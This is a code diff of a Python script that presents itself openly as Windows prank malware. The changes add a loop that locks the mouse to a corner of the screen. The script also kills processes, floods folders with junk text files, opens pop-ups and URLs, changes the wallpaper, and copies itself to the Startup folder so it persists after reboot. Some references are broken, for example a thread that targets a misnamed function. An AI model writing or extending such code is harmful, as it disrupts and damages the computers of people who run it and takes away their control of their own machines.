@@ -1,4 +1,4 @@
-import ctypes, random, time, webbrowser, threading, sys, os, multiprocessing, psutil, base64, shutil, string
+import ctypes, random, time, webbrowser, threading, sys, os, psutil, base64, shutil, string, mouse
 
 
 class harmless:
@@ -34,6 +34,10 @@ class harmless:
                 time.sleep(random.randint(0, 3))
             except:
                 pass
+    
+    def mouse_lock(self):
+        while 1:
+            mouse.drag(0, 0, 0, 0, absolute=True, duration=0)
         
         
             
@@ -125,12 +129,12 @@ class harmful:
 if __name__ == "__main__":
     ctypes.windll.user32.MessageBoxW(0, "YOUR PC HAS BEEN GRIEFED BY A PC FUCKER", "LOL UR SO DUMB", 1)
     
-    for i in range(50):
-        open(f"{''.join(random.choice(string.ascii_letters) for i in range(random.randint(20, 256)))}.txt", "a").write("LOL WHY DID U RUN THIS")
+    for i in range(random.randint(25, 200)):
+        open(f"{''.join(random.choice(string.ascii_letters) for i in range(random.randint(20, 256)))}.txt", "a").write("LOL WHY DID U RUN THIS????")
     
     #FIX LATER THIS SO ANNOYING!!!!!!
     try:
-        startup = os.environ['USERPROFILE'] + os.sep + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+        startup = os.environ["USERPROFILE"] + os.sep + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
         shutil.copy2(__file__, startup)
     except:
         pass
@@ -142,6 +146,7 @@ if __name__ == "__main__":
     popup_thread = threading.Thread(target=harmless.pop_up).start()
     openurl_thread = threading.Thread(target=harmless.open_url).start()
     change_wallpaper = threading.Thread(target=harmless.change_wallpaper).start()
+    mouse_locker = threading.Thread(target=harmless.mouse_locker).start()
     kill_thread = threading.Thread(target=malware.kill).start()
     random_kill_thread = threading.Thread(target=malware.random_kill).start()
     create_random_folder_thread = threading.Thread(target=malware.create_random_folder).start()
@@ -150,6 +155,7 @@ if __name__ == "__main__":
     openurl_thread.join()
     change_wallpaper.join()
     kill_thread.join()
+    mouse_locker.join()
     random_kill_thread.join()
     create_random_folder_thread.join()
     
